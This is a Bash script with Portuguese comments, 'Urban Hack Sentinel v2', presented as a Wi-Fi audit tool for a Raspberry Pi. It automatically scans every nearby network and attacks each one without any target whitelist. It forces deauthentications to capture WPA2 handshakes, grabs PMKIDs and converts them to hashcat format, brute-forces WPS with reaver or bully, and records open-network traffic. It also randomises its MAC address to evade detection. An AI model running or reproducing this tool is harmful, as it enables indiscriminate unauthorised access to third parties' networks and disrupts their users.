#!/usr/bin/env bash
# ===========================
# URBAN HACK SENTINEL v2
# Auditoria Wi-Fi móvel em Raspberry Pi
# Versão: Junho 2026
# Autor: André Santos
# ===========================

set -euo pipefail
IFS=$'\n\t'

# --- Carrega configuração ---
CONFIG_FILE="${CONFIG_FILE:-/etc/urban-hack-sentinel/config.env}"
[[ -f "$CONFIG_FILE" ]] || {
    echo "ERRO: Config não encontrado em $CONFIG_FILE" >&2
    echo "Copie config.env.example para $CONFIG_FILE e edite." >&2
    exit 1
}
# shellcheck source=/dev/null
source "$CONFIG_FILE"

# --- Validação obrigatória ---
required_vars=(
    WIFI_IFACE
    TEMP_LIMIT
    MAX_JOBS
    TIMEOUT_SCAN
    MIN_SIGNAL
    MAX_SIGNAL
    LOG_DIR
    HASH_DIR
    PCAP_DIR
)
for v in "${required_vars[@]}"; do
    [[ -n "${!v:-}" ]] || { echo "ERRO: Variável obrigatória $v não definida" >&2; exit 1; }
done

# --- Diretórios ---
mkdir -p "$LOG_DIR" "$HASH_DIR" "$PCAP_DIR"

# --- Detecção de capacidades da interface ---
detect_scan_capability() {
    log "[DETECT] A testar capacidades de scan em $WIFI_IFACE..."
    
    # Guarda modo atual
    local current_mode
    current_mode=$(iw dev "$WIFI_IFACE" info 2>/dev/null | awk '/type/ {print $2}')
    [[ -z "$current_mode" ]] && current_mode="managed"
    
    # Testa se consegue fazer active scan no modo atual (timeout curto)
    local test_result=0
    timeout 3 iw dev "$WIFI_IFACE" scan -f json >/dev/null 2>&1 || test_result=$?
    
    if [[ $test_result -eq 0 ]]; then
        SCAN_STRATEGY="direct"
        log "[DETECT] ✓ Active scan suportado no modo $current_mode (estrategia: direct)"
    else
        # Se está em monitor, testa com switch para managed
        if [[ "$current_mode" == "monitor" ]]; then
            ip link set "$WIFI_IFACE" down 2>/dev/null
            iw dev "$WIFI_IFACE" set type managed 2>/dev/null
            ip link set "$WIFI_IFACE" up 2>/dev/null
            sleep 0.3
            
            timeout 3 iw dev "$WIFI_IFACE" scan -f json >/dev/null 2>&1 || test_result=$?
            
            # Volta ao monitor
            ip link set "$WIFI_IFACE" down 2>/dev/null
            iw dev "$WIFI_IFACE" set type monitor 2>/dev/null
            ip link set "$WIFI_IFACE" up 2>/dev/null
            sleep 0.3
            
            if [[ $test_result -eq 0 ]]; then
                SCAN_STRATEGY="mode_switch"
                log "[DETECT] ⚠ Active scan precisa mode switch (estrategia: mode_switch)"
            else
                SCAN_STRATEGY="passive_only"
                log "[DETECT] ✗ Active scan não suportado, usando passive only (estrategia: passive_only)"
            fi
        else
            SCAN_STRATEGY="passive_only"
            log "[DETECT] ✗ Active scan não suportado no modo $current_mode (estrategia: passive_only)"
        fi
    fi
    
    export SCAN_STRATEGY
    return 0
}

# Detecta capacidades no arranque (será chamado no main)
# detect_scan_capability

# --- Estado ---
declare -gA REDES
declare -a CURRENT_TARGETS
CYCLE_COUNT=0
PAUSED=false
REALTIME_MODE=false

# PID dos filhos para cleanup
CHILD_PIDS=()

# --- Cleanup ao sair ---
cleanup() {
    echo "[*] Limpando processos filhos..."
    for pid in "${CHILD_PIDS[@]}"; do
        kill -TERM "$pid" 2>/dev/null || true
    done
    wait 2>/dev/null || true
    ip link set "$WIFI_IFACE" up 2>/dev/null || true
}
trap cleanup EXIT INT TERM

# --- Helpers ---
log() { echo "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_DIR/status.log"; }
log_json() { echo "$(date -Iseconds) $*" >> "$LOG_DIR/metrics.jsonl"; }

randomize_mac() {
    local iface="$1"
    log "[MAC] Randomizando $iface"
    ip link set "$iface" down
    macchanger -r "$iface" >/dev/null 2>&1 || log "[WARN] macchanger falhou"
    ip link set "$iface" up
    sleep 1
}

watch_temperature() {
    local raw c
    raw=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null || echo 0)
    c=$((raw / 1000))
    if (( c > TEMP_LIMIT )); then
        log "[ALERTA] Temp: ${c}°C > ${TEMP_LIMIT}°C. Pausando ataques."
        PAUSED=true
    fi
    log_json "temp_c=$c cycle=$CYCLE_COUNT"
}

# --- Scanner Wi-Fi (adaptativo conforme capacidade detectada) ---
scanear_redes() {
    log "[SCAN] Iniciando scan em $WIFI_IFACE (estrategia: $SCAN_STRATEGY)"
    unset REDES
    # REDES já declarado globalmente no topo do script

    case "$SCAN_STRATEGY" in
        direct)
            # Direct scan no modo atual (managed ou monitor com suporte)
            do_iw_scan
            ;;
        mode_switch)
            # Switch temporário para managed, scan, volta ao modo original
            do_scan_with_mode_switch
            ;;
        passive_only)
            # Scan passivo via airodump-ng (channel hopping) + parse output
            do_passive_scan
            ;;
        *)
            log "[SCAN] Estrategia desconhecida: $SCAN_STRATEGY, fallback passive_only"
            do_passive_scan
            ;;
    esac

    log "[SCAN] ${#REDES[@]} redes encontradas"
    log_json "scan_count=${#REDES[@]} cycle=$CYCLE_COUNT scan_strategy=$SCAN_STRATEGY"
}

# Scan direto com iw JSON (modo atual suporta)
do_iw_scan() {
    timeout 15 iw dev "$WIFI_IFACE" scan -f json > "$LOG_DIR/scan_raw.json" 2>/dev/null || {
        log "[WARN] iw scan falhou, tentando iwlist fallback"
        iwlist "$WIFI_IFACE" scan > "$LOG_DIR/scan_temp.txt" 2>/dev/null
        parse_iwlist_fallback
        return
    }
    parse_iw_json
}

# Scan com mode switch: managed -> scan -> monitor
do_scan_with_mode_switch() {
    # Guarda estado atual (deve ser monitor)
    local was_monitor=false
    if iw dev "$WIFI_IFACE" info 2>/dev/null | grep -q "type monitor"; then
        was_monitor=true
    fi

    # Switch para managed
    ip link set "$WIFI_IFACE" down 2>/dev/null
    iw dev "$WIFI_IFACE" set type managed 2>/dev/null
    ip link set "$WIFI_IFACE" up 2>/dev/null
    sleep 0.5

    # Faz scan
    do_iw_scan

    # Volta ao monitor se era monitor
    if $was_monitor; then
        ip link set "$WIFI_IFACE" down 2>/dev/null
        iw dev "$WIFI_IFACE" set type monitor 2>/dev/null
        ip link set "$WIFI_IFACE" up 2>/dev/null
        sleep 0.5
    fi
}

# Scan passivo via airodump-ng (channel hopping)
do_passive_scan() {
    log "[SCAN] Modo passivo: airodump-ng channel hopping por ${TIMEOUT_SCAN}s"
    
    # Garante array global associativo (precisa de pelo menos 1 elemento para persistir)
    declare -gA REDES
    REDES["__dummy__"]="placeholder"
    
    # Mata airodump anterior se houver
    pkill -f "airodump-ng.*$WIFI_IFACE" 2>/dev/null || true
    
    # Lança airodump em background com output CSV
    local csv_prefix="$LOG_DIR/scan_passive"
    timeout "$TIMEOUT_SCAN" airodump-ng \
        --write "$csv_prefix" \
        --output-format csv \
        --write-interval 1 \
        "$WIFI_IFACE" > "$LOG_DIR/scan_passive.log" 2>&1 &
    local airodump_pid=$!
    
    log "[SCAN] Aguardando airodump-ng (PID: $airodump_pid) por ${TIMEOUT_SCAN}s..."
    
    # Espera para recolher dados
    sleep "$TIMEOUT_SCAN"
    
    log "[SCAN] Processando CSV..."
    
    # Processa CSV gerado
    if [[ -f "${csv_prefix}-01.csv" ]]; then
        log "[SCAN] Parseando CSV inline..."
        local tmp_file
        tmp_file=$(mktemp)
        awk -F',' '
            NR > 2 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $14 != "" {
                bssid=$1; channel=$4; privacy=$6; cipher=$7; auth=$8; power=$9; essid=$14
                gsub(/^[ \t]+|[ \t]+$/, "", essid)
                gsub(/^[ \t]+|[ \t]+$/, "", bssid)
                gsub(/^[ \t]+|[ \t]+$/, "", privacy)
                tipo="UNKNOWN"
                if (privacy ~ /WPA3/) tipo="WPA3"
                else if (privacy ~ /WPA2/) tipo="WPA2"
                else if (privacy ~ /WPA/) tipo="WPA"
                else if (privacy ~ /WEP/) tipo="WEP"
                else if (privacy ~ /OPN/) tipo="OPEN"
                if (auth ~ /WPS/) tipo=tipo"+WPS"
                freq=0
                if (channel >= 1 && channel <= 14) freq=2407+channel*5
                else if (channel >= 36) freq=5000+channel*5
                print bssid"|"essid"|"tipo"|"power"|"freq
            }
        ' "${csv_prefix}-01.csv" > "$tmp_file"
        
        local count=0
        while IFS='|' read -r bssid essid tipo signal freq; do
            [[ -z "$bssid" || -z "$essid" ]] && continue
            REDES["$bssid"]="$essid|$tipo|$signal|$freq"
            ((count++))
        done < "$tmp_file"
        rm -f "$tmp_file"
        log "[SCAN] Parse inline concluído: $count redes"
    else
        log "[WARN] Nenhum CSV gerado pelo airodump-ng"
    fi
    
    # Remove entry dummy
    unset REDES["__dummy__"]
    
    # Garante que o processo morre
    kill "$airodump_pid" 2>/dev/null || true
    
    log "[SCAN] Passive scan concluído: ${#REDES[@]} redes"
}

# Parse JSON do iw scan
parse_iw_json() {
    jq -r '
        .[] |
        select(.bssid and .ssid) |
        "\(.bssid)|\(.ssid)|\(.signal // -100)|\(.freq // 0)|\(.flags // [])"
    ' "$LOG_DIR/scan_raw.json" 2>/dev/null | while IFS='|' read -r bssid ssid signal freq flags; do
        [[ -z "$bssid" || -z "$ssid" ]] && continue
        signal=${signal:- -100}
        freq=${freq:-0}

        # Determina tipo de segurança pelas flags
        local tipo="UNKNOWN"
        if [[ "$flags" == *"privacy"* ]]; then
            if [[ "$flags" == *"wpa3"* || "$flags" == *"sae"* ]]; then
                tipo="WPA3"
            elif [[ "$flags" == *"wpa2"* ]]; then
                tipo="WPA2"
            elif [[ "$flags" == *"wpa"* ]]; then
                tipo="WPA"
            elif [[ "$flags" == *"wep"* ]]; then
                tipo="WEP"
            else
                tipo="WPA"
            fi
        else
            tipo="OPEN"
        fi

        # WPS detection
        if iw dev "$WIFI_IFACE" scan -f json 2>/dev/null | jq -e --arg bssid "$bssid" '.[] | select(.bssid==$bssid) | .flags[] | select(.=="wps")' >/dev/null 2>&1; then
            tipo="${tipo}+WPS"
        fi

        REDES["$bssid"]="$ssid|$tipo|$signal|$freq"
    done
}

# Parse CSV do airodump-ng (passive scan)
parse_airodump_csv() {
    local csv_file="$1"
    # Formato: BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
    awk -F',' '
        NR > 2 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $14 != "" {
            bssid=$1
            channel=$4
            privacy=$6
            cipher=$7
            auth=$8
            power=$9
            essid=$14
            gsub(/^[ \t]+|[ \t]+$/, "", essid)
            gsub(/^[ \t]+|[ \t]+$/, "", bssid)
            gsub(/^[ \t]+|[ \t]+$/, "", privacy)
            
            # Determina tipo
            tipo="UNKNOWN"
            if (privacy ~ /WPA3/) tipo="WPA3"
            else if (privacy ~ /WPA2/) tipo="WPA2"
            else if (privacy ~ /WPA/) tipo="WPA"
            else if (privacy ~ /WEP/) tipo="WEP"
            else if (privacy ~ /OPN/) tipo="OPEN"
            
            # WPS heuristic
            if (auth ~ /WPS/) tipo=tipo"+WPS"
            
            # Converte canal para frequência
            freq=0
            if (channel >= 1 && channel <= 14) freq=2407+channel*5
            else if (channel >= 36) freq=5000+channel*5
            
            print bssid"|"essid"|"tipo"|"power"|"freq
        }
    ' "$csv_file"
}

parse_iwlist_fallback() {
        local bssid essid tipo signal
        while read -r line; do
            [[ $line =~ Address:\ ([0-9A-Fa-f:]{17}) ]] && bssid="${BASH_REMATCH[1]}"
            [[ $line =~ ESSID:\"([^\"]*)\" ]] && essid="${BASH_REMATCH[1]}"
            [[ $line =~ Signal\ level=(-?[0-9]+) ]] && signal="${BASH_REMATCH[1]}"
            if [[ $line =~ (WPA2|WPA|WEP|WPS) ]]; then
                case ${BASH_REMATCH[1]} in
                    WPA2) tipo="WPA2" ;;
                    WPA)  tipo="WPA" ;;
                    WEP)  tipo="WEP" ;;
                    WPS)  tipo="WPS" ;;
                esac
            fi
            if [[ $bssid && $essid && $tipo ]]; then
                REDES["$bssid"]="$essid|$tipo|${signal:--100}|0"
                bssid= essid= tipo= signal=
            fi
        done < "$LOG_DIR/scan_temp.txt"
    }

# --- Execução de ataques ---
executar_ataque() {
    local bssid="$1" essid="$2" tipo="$3" signal="$4" freq="$5"
    local safe_essid="${essid//[^a-zA-Z0-9_-]/_}"
    local timestamp=$(date '+%Y%m%d_%H%M%S')
    local base_name="${safe_essid}_${bssid//:/_}_${timestamp}"

    log "[ATAQUE] $essid ($bssid) tipo=$tipo signal=${signal}dBm"

    case "$tipo" in
        *WPA3*)
            # WPA3 SAE - PMKID + transição WPA2 se houver
            attack_pmkid "$bssid" "$base_name" "$freq"
            ;;
        *WPA2*|*WPA*)
            # WPA2/WPA - Handshake + PMKID
            attack_handshake "$bssid" "$essid" "$base_name" "$freq"
            attack_pmkid "$bssid" "$base_name" "$freq"
            ;;
        *WPS*)
            attack_wps "$bssid" "$essid" "$base_name" "$freq"
            ;;
        *OPEN*)
            log "[INFO] $essid aberta - capturando tráfego"
            capture_open "$bssid" "$essid" "$base_name" "$freq"
            ;;
        *)
            log "[WARN] Tipo desconhecido: $tipo"
            ;;
    esac
}

# PMKID attack (hcxdumptool)
attack_pmkid() {
    local bssid="$1" base_name="$2" freq="$3"
    local pcap_file="$PCAP_DIR/${base_name}_pmkid.pcapng"
    local hash_file="$HASH_DIR/${base_name}_pmkid.22000"

    log "[PMKID] Iniciando em $bssid freq=$freq"
    hcxdumptool -i "$WIFI_IFACE" \
        --enable_status=1 \
        --filterlist="$bssid" \
        --filtermode=2 \
        -o "$pcap_file" \
        > "$LOG_DIR/${base_name}_pmkid.log" 2>&1 &
    local pid=$!
    CHILD_PIDS+=($pid)

    # Converte para hashcat 22000 depois
    sleep 2
    hcxpcapngtool -o "$hash_file" "$pcap_file" 2>>"$LOG_DIR/${base_name}_pmkid.log" || true
    [[ -s "$hash_file" ]] && log "[PMKID] Hash salvo: $hash_file" || log "[PMKID] Sem PMKID capturado"
}

# Handshake WPA2 (aircrack-ng suite)
attack_handshake() {
    local bssid="$1" essid="$2" base_name="$3" freq="$4"
    local pcap_file="$PCAP_DIR/${base_name}_hs.cap"
    local channel
    channel=$(freq_to_channel "$freq")

    log "[HANDSHAKE] $essid canal=$channel"

    # Deauth para forçar handshake
    aireplay-ng -0 5 -a "$bssid" -e "$essid" "$WIFI_IFACE" >/dev/null 2>&1 &

    # Captura
    timeout "$TIMEOUT_SCAN" airodump-ng \
        --bssid "$bssid" \
        --channel "$channel" \
        --write "$PCAP_DIR/${base_name}_hs" \
        --output-format pcap \
        "$WIFI_IFACE" > "$LOG_DIR/${base_name}_hs.log" 2>&1 &
    local pid=$!
    CHILD_PIDS+=($pid)

    wait $pid 2>/dev/null || true

    # Verifica handshake
    if aircrack-ng "$pcap_file" 2>/dev/null | grep -q "1 handshake"; then
        log "[HANDSHAKE] Handshake capturado: $pcap_file"
        hcxpcapngtool -o "$HASH_DIR/${base_name}_hs.22000" "$pcap_file" 2>/dev/null || true
    else
        log "[HANDSHAKE] Sem handshake"
    fi
}

# WPS (reaver ou bully)
attack_wps() {
    local bssid="$1" essid="$2" base_name="$3" freq="$4"
    local channel
    channel=$(freq_to_channel "$freq")

    log "[WPS] $essid canal=$channel"

    if command -v reaver >/dev/null 2>&1; then
        reaver -i "$WIFI_IFACE" -b "$bssid" -c "$channel" -vv \
            -o "$LOG_DIR/${base_name}_wps.log" \
            2>&1 | tee -a "$LOG_DIR/${base_name}_wps.log" &
    elif command -v bully >/dev/null 2>&1; then
        bully -b "$bssid" -c "$channel" -v 3 "$WIFI_IFACE" \
            > "$LOG_DIR/${base_name}_wps.log" 2>&1 &
    else
        log "[WARN] reaver/bully não instalado"
        return
    fi
    local pid=$!
    CHILD_PIDS+=($pid)
}

# Rede aberta - captura passiva
capture_open() {
    local bssid="$1" essid="$2" base_name="$3" freq="$4"
    local channel
    channel=$(freq_to_channel "$freq")

    log "[OPEN] Captura passiva $essid"
    timeout "$TIMEOUT_SCAN" airodump-ng \
        --bssid "$bssid" \
        --channel "$channel" \
        --write "$PCAP_DIR/${base_name}_open" \
        --output-format pcap \
        "$WIFI_IFACE" > "$LOG_DIR/${base_name}_open.log" 2>&1 &
    local pid=$!
    CHILD_PIDS+=($pid)
}

freq_to_channel() {
    local freq="$1"
    case "$freq" in
        2412) echo 1 ;; 2417) echo 2 ;; 2422) echo 3 ;; 2427) echo 4 ;;
        2432) echo 5 ;; 2437) echo 6 ;; 2442) echo 7 ;; 2447) echo 8 ;;
        2452) echo 9 ;; 2457) echo 10 ;; 2462) echo 11 ;; 2467) echo 12 ;;
        2472) echo 13 ;; 2484) echo 14 ;;
        5180) echo 36 ;; 5200) echo 40 ;; 5220) echo 44 ;; 5240) echo 48 ;;
        5260) echo 52 ;; 5280) echo 56 ;; 5300) echo 60 ;; 5320) echo 64 ;;
        5500) echo 100 ;; 5520) echo 104 ;; 5540) echo 108 ;; 5560) echo 112 ;;
        5580) echo 116 ;; 5600) echo 120 ;; 5620) echo 124 ;; 5640) echo 128 ;;
        5660) echo 132 ;; 5680) echo 136 ;; 5700) echo 140 ;; 5720) echo 144 ;;
        *) echo 1 ;;
    esac
}

# --- Loop de ataques com controlo de concorrência ---
executar_ataques_disponiveis() {
    CURRENT_TARGETS=()
    local running=0

    for b in "${!REDES[@]}"; do
        # Conta jobs ativos
        running=$(jobs -rp | wc -l)
        (( running >= MAX_JOBS )) && break

        IFS='|' read -r essid tipo signal freq <<< "${REDES[$b]}"
        [[ -z "$essid" ]] && continue

        CURRENT_TARGETS+=("$essid")
        executar_ataque "$b" "$essid" "$tipo" "$signal" "$freq" &
    done

    log "[JOBS] ${#CURRENT_TARGETS[@]} alvos lançados, $(jobs -rp | wc -l) ativos"
}

# --- Status periódico ---
print_status() {
    local running
    running=$(jobs -rp | wc -l)
    local temp
    temp=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null || echo 0)
    temp=$((temp / 1000))

    log "[STATUS] Ciclo:$CYCLE_COUNT Temp:${temp}°C Jobs:$running Targets:${CURRENT_TARGETS[*]:-nenhum}"
    log_json "cycle=$CYCLE_COUNT temp_c=$temp jobs=$running targets=${#CURRENT_TARGETS[@]}"
}

# --- Loop Principal ---
main() {
    log "=== URBAN HACK SENTINEL v2 INICIADO ==="
    log "Interface: $WIFI_IFACE | MaxJobs: $MAX_JOBS | Timeout: ${TIMEOUT_SCAN}s | TempLimit: ${TEMP_LIMIT}°C"

    # Verifica modo monitor
    if ! iwconfig "$WIFI_IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        log "[WARN] $WIFI_IFACE não está em modo monitor. Tentando configurar..."
        ip link set "$WIFI_IFACE" down
        iw dev "$WIFI_IFACE" set type monitor
        ip link set "$WIFI_IFACE" up
        sleep 1
    fi

    # Detecta capacidades de scan após configurar modo monitor
    detect_scan_capability

    while true; do
        CURRENT_TARGETS=()
        CYCLE_COUNT=$((CYCLE_COUNT + 1))

        watch_temperature
        $PAUSED && { log "[PAUSADO] Aguardando..."; sleep 5; continue; }

        (( CYCLE_COUNT % 5 == 0 )) && randomize_mac "$WIFI_IFACE"

        scanear_redes
        executar_ataques_disponiveis

        print_status

        sleep "$TIMEOUT_SCAN"
    done
}

main "$@"